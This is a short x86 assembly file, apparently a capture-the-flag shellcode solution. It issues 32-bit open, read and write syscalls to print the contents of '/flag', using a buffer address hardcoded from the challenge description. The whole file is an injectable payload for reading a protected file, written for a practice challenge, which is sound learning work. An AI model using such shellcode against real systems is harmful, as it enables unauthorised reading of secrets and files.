.global _start
_start:
#1st ebx, rdi
#2nd ecx, rsi
#3rd edx, rdx
#4rd esi, rcx

.intel_syntax noprefix
        mov r9d, 0x1337500
        #open
        mov eax, 0x5 #syscall OPEN
        mov ecx, 0x0
        lea ebx, [eip+flag]
        int 0x80

        #read
        mov ebx, eax
        mov eax, 0x3
        mov ecx, r9d
        mov edx, 0x100
        int 0x80

        #write
        mov ebx, 0x1
        mov ecx, r9d
        mov edx, eax
        mov eax, 0x4
        int 0x80

    flag:
        .ascii "/flag\0"

#buff of read should be placed somewhere - I have hardcoded memory address from desc
